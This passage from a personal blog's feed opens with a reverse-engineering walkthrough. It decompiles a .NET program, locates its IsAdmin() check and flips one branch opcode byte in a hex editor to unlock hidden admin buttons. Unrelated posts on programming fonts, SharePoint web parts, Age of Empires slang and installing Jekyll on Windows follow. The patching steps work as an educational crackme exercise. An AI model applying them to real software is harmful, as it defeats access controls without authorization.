&lt;p&gt;&lt;img alt='' src='/images/netapp.png' /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s open the assembly in Reflector and see what it&amp;#8217;s doing.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/reflector.png' /&gt;&lt;/p&gt;

&lt;p&gt;From the reflector, I could figure out the following&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The form has got actually 3 buttons, 2 are hidden&lt;/li&gt;

&lt;li&gt;There is a &lt;em&gt;BusinessClass&lt;/em&gt; class in the assembly which is invoked by the hidden buttons&lt;/li&gt;

&lt;li&gt;The visible button checks if the user is &lt;em&gt;Admin&lt;/em&gt; and hides or shows the other two buttons&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, our job is to become the Admin :) . That&amp;#8217;s the code which is called by the Visible button &lt;strong&gt;Identify me&lt;/strong&gt;&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt; &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;identifyUser&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
      &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;IsAdmin&lt;/span&gt;&lt;span class='p'&gt;())&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;labUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Text&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Welcome Admin!&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTP&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTPS&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
      &lt;span class='k'&gt;else&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;labUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Text&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Welcome User!&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTP&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTPS&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Clearly, our main interest is in &lt;em&gt;IsAdmin()&lt;/em&gt; function which is defined as follows:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='nf'&gt;IsAdmin&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
      &lt;span class='k'&gt;foreach&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;object&lt;/span&gt; &lt;span class='n'&gt;obj&lt;/span&gt; &lt;span class='k'&gt;in&lt;/span&gt; &lt;span class='n'&gt;Dns&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GetHostEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;Dns&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GetHostName&lt;/span&gt;&lt;span class='p'&gt;()).&lt;/span&gt;&lt;span class='n'&gt;AddressList&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;obj&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ToString&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='n'&gt;Equals&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;258.54.54.699&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;))&lt;/span&gt;
          &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
      &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Hmmm. Very Interesting !!! Do you understand what is it doing ?&lt;/p&gt;

&lt;p&gt;It basically retrieving the host name of our computer and based on that hostname getting all the IP addresses assigned to the network interfaces present in the system. If any of its IP address matches &lt;em&gt;258.54.54.699&lt;/em&gt;, I am the Admin :).&lt;/p&gt;

&lt;p&gt;Now the interesting part here is that &lt;em&gt;258.54.54.699&lt;/em&gt; is actually an invalid IP address otherwise I could have fooled the program by temporarily assigning this IP address to either one of my interfaces or even write that in &lt;em&gt;hosts&lt;/em&gt; file.&lt;/p&gt;

&lt;p&gt;But since its invalid IP, it will never be returned by system API. So, we must patch the program.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s open the function in &lt;em&gt;ILDASM&lt;/em&gt; and look at its disassembly.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;  IL_001c:  ldloc.1
  IL_001d:  callvirt   instance string [mscorlib]System.Object::ToString()
  IL_0022:  ldstr      &amp;quot;258.54.54.699&amp;quot;
  IL_0027:  callvirt   instance bool [mscorlib]System.String::Equals(string)
  IL_002c:  brfalse.s  IL_0032
  IL_002e:  ldc.i4.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;There are several ways to do it. I will write down from tedious to easiest&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Export the classes from Reflector to Visual Studio solution and change the IP address to our actual IP address. But then Why not just NOP out the call itself :). This requires boring effort&lt;/li&gt;

&lt;li&gt;Use the ILASM or any other utility to change the instruction at &lt;em&gt;ldstr &amp;#8220;258.54.54.699&amp;#8221;&lt;/em&gt; to &lt;em&gt;ldstr actual ip&lt;/em&gt;. Even this requires some effort&lt;/li&gt;

&lt;li&gt;Easiest Way: Actually we can just take advantage of if-else branch reversal.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;#8217;s take a look at disassembly of &lt;em&gt;identifyuser()&lt;/em&gt; function&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/ildasm-output.png' /&gt;&lt;/p&gt;

&lt;p&gt;If you closely look at the disassembly above, the instruction at IL_0006 is doing all the magic which is&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;  IL_0006:  /* 2C   | 29               */ brfalse.s  IL_0031
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;What this instruction means is that if output of &lt;em&gt;IsAdmin()&lt;/em&gt; is false, branch to instruction at IL_0031, the instruction which hides the buttons. Now, we can just change this instruction to reverse, i.e. make it &lt;strong&gt;brtrue.s&lt;/strong&gt;. A quick look at &lt;a href='http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.brtrue_s\(v=vs.71\'&gt;MSDN&lt;/a&gt;.aspx) tells me that its opcode is 2D as opposed to 2C which stands for &lt;strong&gt;brfalse.s&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Now, we just need to fire up the favourite hex editor and &lt;strong&gt;change just one byte.&lt;/strong&gt; from 2C to 2D.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

000005A0  02 28 02 00 00 06 02 28 05 00 00 06 2A 1E 02 28  
000005B0  05 00 00 06 2A 00 00 00 03 30 02 00 5A 00 00 00  
000005C0  00 00 00 00 02 28 06 00 00 06 2D 29 02 7B 02 00  
000005D0  00 04 72 F5 00 00 70 6F 1E 00 00 0A 02 7B 04 00  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Our target lies at offset 5CA which I have already flipped from 2C to 2D as shown above. Let&amp;#8217;s save the file and run it again.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/cracked.png' /&gt;&lt;/p&gt;

&lt;p&gt;Voilla !!! The Administrative buttons are visible and clicking them invokes the Business functions which fetch some HTML output over the internet :)&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Best fonts for programming</title>
   <link href="http://madhur.co.in/blog/2011/09/09/bestfontscode.html"/>
   <updated>2011-09-09T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/09/bestfontscode</id>
   <content type="html">&lt;p&gt;Recently I have been observing the change in the trend in the preferred font for programming.&lt;/p&gt;

&lt;p&gt;Back in the earlier days &lt;em&gt;Courier New&lt;/em&gt; used to be the preferred font for programming. This was the default font in Visual Studio 2008. However, with later operating Systems and tools such as Visual Studio 2010, &lt;em&gt;Consolas&lt;/em&gt; is becoming the top preferred font for programming.&lt;/p&gt;

&lt;p&gt;The screenshot below shows the same code with Courier New and Consolas.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/courier-vs.png' /&gt; &lt;img alt='' src='/images/consolas-vs.png' /&gt;&lt;/p&gt;

&lt;p&gt;The prime difference between two fonts is that Consolas is Clear Type optimized font. &lt;a href='http://en.wikipedia.org/wiki/ClearType'&gt;Clear Type&lt;/a&gt; is the Microsoft implementation of &lt;a href='http://en.wikipedia.org/wiki/TrueType'&gt;True Type&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Programmers also need to work with Console and terminals as well be it Win OS or Linux. Still in Windows 7, 2008 R2, font in Command Prompt or Powershell is by default set to &lt;em&gt;Raster fonts&lt;/em&gt; which by default maps to either &lt;em&gt;Terminal&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;You might be wondering why there are only limited options to set the font in Command prompt or Powershell. You can enable more options by editing the registry as outlined in this &lt;a href='http://support.microsoft.com/default.aspx?scid=kb;EN-US;Q247815'&gt;KB article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The reasoning for this is also detailed by veteran MS employee &lt;strong&gt;Raymond Chen&lt;/strong&gt; in his &lt;a href='http://blogs.msdn.com/b/oldnewthing/archive/2007/05/16/2659903.aspx'&gt;The Old new thing blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Consolas works even better with Consoles and terminal windows as well. The screen shot below compares &lt;em&gt;Terminal&lt;/em&gt; and &lt;em&gt;Consolas&lt;/em&gt; in command prompt. Decide for yourself.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/raster-con.png' /&gt; &lt;img alt='' src='/images/consolas-con.png' /&gt;&lt;/p&gt;

&lt;p&gt;I have also switched from &lt;em&gt;Terminal&lt;/em&gt; to &lt;em&gt;Consolas&lt;/em&gt; in my favourite editor &lt;a href='http://notepad-plus-plus.org/'&gt;Notepad++&lt;/a&gt;. It definitely looks better, see below&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/notepad-term.png' /&gt; &lt;img alt='' src='/images/notepad-cons.png' /&gt;&lt;/p&gt;

&lt;h2 id='installing_consolas_in_linux'&gt;Installing Consolas in Linux&lt;/h2&gt;

&lt;p&gt;You might also want to use Consolas in Linux terminal and Gedit, Gvim or vim.&lt;/p&gt;

&lt;h2 id='method_1'&gt;Method 1&lt;/h2&gt;

&lt;p&gt;Create a &amp;#8216;.fonts&amp;#8217; folder in your home directory and copy the necessary fonts into it. Now you have access to the fonts on a per user basis.&lt;/p&gt;

&lt;h2 id='method_2'&gt;Method 2&lt;/h2&gt;

&lt;p&gt;First find out in which location linux has installed the truetype fonts.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;find /usr -iname \*.ttf |head -n 5
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Once you know the path of the fonts directory, move to this directory and create a folder there (it can be any name). Next copy all the windows ttf fonts to the windowsfonts directory that was just created.&lt;/p&gt;

&lt;p&gt;Now change the ownership of the fonts as well as make sure they have a right of 644 .&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;# chown root.root *.ttf
# chmod 644 *.ttf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Run the command mkfontdir while in the windowsfonts directory.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;# mkfontdir
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will create an index of the fonts in the directory. It will also create two files fonts.dir and fonts.cache-1 . Now moving to the parent directory, edit the file fonts.cache-1 using your favourate editor and append the following line to it.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;File: /usr/share/fonts/truetype/fonts.cache-1
...
&amp;quot;windowsfonts&amp;quot; 0 &amp;quot;.dir&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Lastly run the command fc-cache.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt; fc-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id='other_good_programming_fonts'&gt;Other good programming fonts&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Inconsolata&lt;/li&gt;

&lt;li&gt;Proggy Clean&lt;/li&gt;

&lt;li&gt;Terminus&lt;/li&gt;

&lt;li&gt;Fixed Sys&lt;/li&gt;

&lt;li&gt;Andale Mono&lt;/li&gt;

&lt;li&gt;Anonymous&lt;/li&gt;

&lt;li&gt;Terminus&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='references'&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://www.codeproject.com/KB/work/FontSurvey.aspx'&gt;http://www.codeproject.com/KB/work/FontSurvey.aspx&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://stackoverflow.com/questions/485174/programming-fonts'&gt;http://stackoverflow.com/questions/485174/programming-fonts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Removing the Default Editor Parts from SharePoint Web Parts</title>
   <link href="http://madhur.co.in/blog/2011/09/06/hidingproppane.html"/>
   <updated>2011-09-06T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/06/hidingproppane</id>
   <content type="html">&lt;p&gt;I was recently asked how to remove the Editor Parts (Appearance, Layout, Advanced, etc) from custom Web Parts.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MyEditorPart&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;EditorPart&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;CreateChildControls&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;        &lt;span class='c1'&gt;// this line hides the default EditorParts&lt;/span&gt;
        &lt;span class='n'&gt;Parent&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Controls&lt;/span&gt;&lt;span class='p'&gt;[&lt;/span&gt;&lt;span class='m'&gt;2&lt;/span&gt;&lt;span class='p'&gt;].&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;base&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CreateChildControls&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='nf'&gt;ApplyChanges&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='c1'&gt;// do stuff here&lt;/span&gt;
        &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;SyncChanges&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='c1'&gt;// do stuff here&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MyWebPart&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;WebPart&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='n'&gt;EditorPartCollection&lt;/span&gt; &lt;span class='nf'&gt;CreateEditorParts&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='n'&gt;ArrayList&lt;/span&gt; &lt;span class='n'&gt;aryParts&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;ArrayList&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

        &lt;span class='n'&gt;MyEditorPart&lt;/span&gt; &lt;span class='n'&gt;myEditor&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;MyEditorPart&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
        &lt;span class='n'&gt;myEditor&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ID&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ID&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;_myEditorPart&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='n'&gt;aryParts&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;myEditor&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

        &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='nf'&gt;EditorPartCollection&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;aryParts&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='c1'&gt;// do more stuff here...&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>AOE slang</title>
   <link href="http://madhur.co.in/blog/2011/09/06/aoeslang.html"/>
   <updated>2011-09-06T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/06/aoeslang</id>
   <content type="html">&lt;h2 id='chat_slangs'&gt;Chat Slangs&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;fc&lt;/strong&gt; : Fast Castle&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;gg&lt;/strong&gt; : Good game - Originally used by defeated players to wish the winners. But now even used as synonym of inevitable defeat as in &lt;strong&gt;&lt;em&gt;if he attacks, its gg :)&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;hf&lt;/strong&gt;: Have fun&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;gl&lt;/strong&gt; : Good luck&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;drush, flush, crush&lt;/strong&gt; : Dark , Feudal, Castle rush respectively&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;bbt&lt;/strong&gt; : Bombard towers&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;ec&lt;/strong&gt;: Elite consquitador&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;noob&lt;/strong&gt;: A beginner in AOE multiplayer gaming&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='map_types'&gt;Map Types&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Michi&lt;/strong&gt;: a type of game map that uses impassable terrain (usually forest) to prevent players from rushing or coming into contact until the intervening terrain is cleared&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;ga&lt;/strong&gt;: Green Arabia&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;bf&lt;/strong&gt;: Black Forest&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;dm&lt;/strong&gt;: Death Match&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;ln ffa&lt;/strong&gt;: Land Nomad Free for all - A type of map with villagers placed randomly on the map and without town center&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='voobly_specific'&gt;Voobly specific&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;fmt&lt;/strong&gt;: Friends may team&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;tg&lt;/strong&gt;: Team Game&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;fp&lt;/strong&gt; : Fast proxy - A player who does&amp;#8217;t have port forwarding properly configured uses fast proxy server. Results in lag in game.&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Running Jekyll on Windows</title>
   <link href="http://madhur.co.in/blog/2011/09/01/runningjekyllwindows.html"/>
   <updated>2011-09-01T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/01/runningjekyllwindows</id>
   <content type="html">&lt;p&gt;Jekyll can also be made to run on Windows Operating System. This prefer when I am working on my office laptop which has Windows 7 installed on it.&lt;/p&gt;

&lt;p&gt;Following packages are required to setup Jekyll on Windows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Ruby : Can be installed from &lt;a href='http://rubyinstaller.org/downloads/'&gt;here&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;Ruby Development Kit: available on &lt;a href='http://rubyforge.org/frs/download.php/75127/rubyinstaller-1.9.2-p290.exe'&gt;here&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;Jekyll&lt;/li&gt;

&lt;li&gt;Python : I used the portable version available &lt;a href='http://portablepython.com/wiki/PortablePython3.2.1.1'&gt;here&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;Pygments&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; Install the Ruby from &lt;a href='http://rubyinstaller.org/downloads/'&gt;http://rubyinstaller.org/downloads/&lt;/a&gt; and install it to path such as C:\ruby&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; Install the Ruby development kit from &lt;a href='http://rubyforge.org/frs/download.php/75127/rubyinstaller-1.9.2-p290.exe'&gt;here&lt;/a&gt; and extract it to path such as c:\devkit. Run the following commands&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;ruby dk.rb init
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;to generate the config.yml file to be used later in this Step&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; Edit the generated config.yml file to include installed Rubies. For example, in our case, it will look like this&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;# This configuration file contains the absolute path locations of all
# installed Rubies to be enhanced to work with the DevKit. This config
# file is generated by the &amp;#39;ruby dk.rb init&amp;#39; step and may be modified
# before running the &amp;#39;ruby dk.rb install&amp;#39; step. To include any installed
# Rubies that were not automagically discovered, simply add a line below
# the triple hyphens with the absolute path to the Ruby root directory.
#
# Example:
#
# ---
# - C:/ruby19trunk
# - C:/ruby192dev
#
---
- C:/ruby
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; Run the following command to install to DevKit enhance your installed Rubies. This step installs (or updates) an operating_system.rb file into the relevant directory needed to implement a RubyGems&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;ruby dk.rb install
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;5&lt;/strong&gt; Install Jekyll using following command&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;gem install jekyll
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;6&lt;/strong&gt; Now, you can start using Jekyll. If you require code highlighting using pygments as well, follow the additional steps as well. Install Portable Python from &lt;a href='http://portablepython.com/wiki/PortablePython3.2.1.1'&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7&lt;/strong&gt; Now we need to install, easy_install. For python versions &amp;gt; 3, this can be installed from &lt;a href='http://pypi.python.org/pypi/distribute'&gt;http://pypi.python.org/pypi/distribute&lt;/a&gt; Download distribute_setup.py and run the following command in python&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;python distribute_setup.py
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;8&lt;/strong&gt; Now to install pygments, simply run this command:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;easy_install Pygments	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;9&lt;/strong&gt; Note that if you are using Python &amp;gt; 3 as discussed in this blog, you are likely to hit the following error when running Pygmentize&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;Liquid error: Bad file descriptor
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;TypeError: Can&amp;#39;t convert &amp;#39;bytes&amp;#39; object to str implicitly
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;These are known issues and the resolution has been discussed here: https://github.com/rtomayko/posix-spawn/issues/17&lt;/p&gt;

